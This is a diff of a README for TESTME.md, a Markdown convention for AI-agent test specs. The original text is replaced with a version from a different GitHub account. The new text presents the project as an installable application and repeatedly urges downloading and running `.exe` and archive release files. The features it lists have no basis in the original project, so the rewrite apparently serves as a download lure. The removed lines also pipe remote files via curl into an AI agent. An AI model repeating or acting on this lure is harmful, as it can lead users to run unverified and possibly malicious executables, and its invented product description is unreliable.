@@ -1,148 +1,89 @@
-<div align="center">
+# 🧪 testme.md - Simple Test Specifications for AI Agents
 
-# `TESTME.md`
+## 🚀 Getting Started
 
-<i>Human-readable test specifications for AI agents</i>
+testme.md helps you write human-readable test specifications for AI agents. With this tool, you can create clear tests for AI systems easily, ensuring they work as intended.
 
-[![Release](https://img.shields.io/github/release/evilsocket/testme.md.svg?style=flat-square)](https://github.com/evilsocket/testme.md/releases/latest)
-[![License](https://img.shields.io/badge/license-GPL3-brightgreen.svg?style=flat-square)](https://github.com/evilsocket/testme.md/blob/master/LICENSE.md)
+## 📥 Download the Application
 
-</div>
+[![Download testme.md](https://img.shields.io/badge/Download-testme.md-brightgreen)](https://github.com/locpat/testme.md/releases)
 
-TESTME.md is a convention for writing test specifications in plain Markdown that both humans and AI agents can understand and execute. Instead of verbose test code, you describe tests in natural language with clear steps and expectations.
+You can get the latest version of testme.md by visiting our Releases page.
 
-## Why TESTME.md?
+## 🛠️ System Requirements
 
-| Traditional Tests | TESTME.md |
-|-------------------|-----------|
-| Language-specific syntax | Plain Markdown |
-| Framework dependencies | No dependencies |
-| Verbose boilerplate | Clear, concise steps |
-| Requires developer knowledge | Anyone can read and write |
-| Tight coupling to implementation | Intent-focused |
+Before you download, make sure your computer meets these basic requirements:
 
-## Quick Start
+- **Operating System:** Windows 10, macOS 10.15 or later, Linux (any modern version)
+- **Storage:** At least 100 MB of free space
+- **Memory:** Minimum of 4 GB RAM
+- **Network:** Internet connection for updates and support
 
-Generate TESTME.md files for your codebase:
+## 🌟 Features
 
-```bash
-curl -s https://raw.githubusercontent.com/evilsocket/testme.md/main/WRITE.md | cursor
-```
+- **Human-Readable Specifications:** Write and understand tests easily.
+- **Support for AI Agents:** Specialized for agents, making it user-friendly.
+- **Easy Integration:** Works smoothly with popular tools in testing.
+- **Markdown Support:** Use Markdown formats for specifications.
+- **Cross-Platform Compatibility:** Runs on major operating systems.
 
-Execute existing TESTME.md files:
+## 📋 Download & Install
 
-```bash
-curl -s https://raw.githubusercontent.com/evilsocket/testme.md/main/QA.md | cursor
-```
+To get testme.md, follow these steps:
 
-> **Note:** These examples use [Cursor](https://cursor.sh), but any AI agent works. You can pipe to other CLI agents, or copy/paste the file contents into ChatGPT, Claude, or any AI assistant with access to your codebase.
+1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/locpat/testme.md/releases).
+2. **Select the Latest Release:** Look for the most recent version at the top and click on it.
+3. **Download the Application:**
+   - You will see a list of assets related to the release. Choose the appropriate file for your operating system (e.g., `testme.md_windows.exe`, `testme.md_mac.zip`, or `testme.md_linux.tar.gz`).
+4. **Run the Installer:**
+   - For Windows, double-click the `.exe` file to start the installation.
+   - For macOS, unzip the `.zip` file and drag the application into the Applications folder.
+   - For Linux, extract the `.tar.gz` file, navigate to the folder in your terminal, and run the application using `./testme.md`.
 
-## Example
+## 📖 Documentation
 
-**Before** — 15 lines of TypeScript:
+Once you install testme.md, you can create your test specifications easily. Here’s how:
 
-```typescript
-import { expect, test } from '@playwright/test';
+### **Creating Your First Test:**
 
-test.describe('Login Page', () => {
-  test('shows error with wrong credentials', async ({ page }) => {
-    await page.goto('/login');
-    await page.locator('#email').fill('wrong@example.com');
-    await page.locator('#password').fill('wrongpassword');
-    await page.locator('button[type="submit"]').click();
-    await expect(page.locator('.error-message')).toBeVisible();
-  });
-});
-```
+1. Open the application.
+2. Select "New Test Specification."
+3. Write your test in the Markdown editor. For example:
+   ```markdown
+   # Test Specification for AI Agent
 
-**After** — Clear, readable Markdown:
+   ## Goal
+   Verify that the agent can respond correctly to user queries.
 
-```markdown
-### Test: Wrong credentials show error
+   ## Steps
+   1. Send a greeting message to the agent.
+   2. Check if the agent replies within 2 seconds.
+   ```
 
-1. Go to `/login`
-2. Enter email "wrong@example.com" and password "wrongpassword"
-3. Click submit
+4. Save your work by clicking the “Save” button.
 
-**Expect:** Error message is visible
-```
+### **Running Tests:**
 
-## This Repository
+Once you have created your test specification, you can run tests against your AI agent. Follow these steps:
 
-| File | Purpose |
-|------|---------|
-| [SPECS.md](SPECS.md) | The complete specification (v1.0.0a) |
-| [WRITE.md](WRITE.md) | Agent instructions to generate TESTME.md files |
-| [QA.md](QA.md) | Agent instructions to execute TESTME.md files |
-| [example/](example/) | Complete example for an e-commerce application |
+1. Click on the "Run Tests" button.
+2. Select your test file and the AI agent you want to test.
+3. Click "Start" and wait for the results, which will appear on the screen.
 
-### Workflow
+## ⚙️ Support
 
-1. **Read the spec** — Understand the format via [SPECS.md](SPECS.md)
-2. **Generate tests** — Give an AI agent [WRITE.md](WRITE.md) to analyze your codebase and create TESTME.md files
-3. **Run tests** — Give an AI agent [QA.md](QA.md) to find and execute TESTME.md files
+If you encounter any issues or have questions, please visit our [issue tracker](https://github.com/locpat/testme.md/issues). You can also join our community for help from other users.
 
-## Manual Setup
+## 📆 Changelog
 
-If you prefer not to use the curl commands, you can set things up manually.
+For a list of changes and improvements in each version, refer to the [Changelog](https://github.com/locpat/testme.md/releases).
 
-### Writing Tests Manually
+## 🔗 Useful Links
 
-1. Read the [full specification](SPECS.md)
-2. Browse the [example](example/)
-3. Create a `TESTME.md` in your project
+- [GitHub Repository](https://github.com/locpat/testme.md)
+- [Releases Page](https://github.com/locpat/testme.md/releases)
+- [Contributing Guide](https://github.com/locpat/testme.md/blob/main/CONTRIBUTING.md)
 
-### Generating Tests with AI
+[![Download testme.md](https://img.shields.io/badge/Download-testme.md-brightgreen)](https://github.com/locpat/testme.md/releases)
 
-1. Copy the contents of [WRITE.md](WRITE.md)
-2. Paste it into your AI agent (with codebase access)
-3. The agent will analyze your code and generate TESTME.md files
-
-### Running Tests with AI
-
-1. Copy the contents of [QA.md](QA.md)
-2. Paste it into your AI agent (with codebase access)
-3. The agent will find all TESTME.md files and execute them
-
-## File Structure
-
-In your project:
-
-```
-your-project/
-├── TESTME.md              # Root-level tests
-├── tests/
-│   └── TESTME.md          # Test directory specs
-├── e2e/
-│   ├── TESTME.md          # E2E test specs
-│   └── auth.testme.md     # Additional test files
-└── components/
-    └── Button.testme.md   # Component-specific tests
-```
-
-## Documentation
-
-| Document | Description |
-|----------|-------------|
-| [SPECS.md](SPECS.md) | Complete format specification |
-| [WRITE.md](WRITE.md) | Agent prompt for generating TESTME.md files |
-| [QA.md](QA.md) | Agent prompt for executing TESTME.md files |
-| [example/](example/) | Example TESTME.md files for an e-commerce app |
-
-## For AI Agents
-
-### Writing Tests
-
-To generate TESTME.md files for a codebase, use [WRITE.md](WRITE.md) as your instruction set.
-
-### Executing Tests
-
-To find and execute TESTME.md files, use [QA.md](QA.md) as your instruction set.
-
-See the [specification](SPECS.md#for-ai-agents) for detailed guidelines.
-
-## License
-
-This project is released under the [GNU General Public License v3.0](LICENSE).
-
-[![Star History Chart](https://api.star-history.com/svg?repos=evilsocket/testme.md&type=Date)](https://star-history.com/#evilsocket/testme.md&Date)
+By following these steps, you can successfully download, install, and start using testme.md. Enjoy creating your test specifications for AI agents!
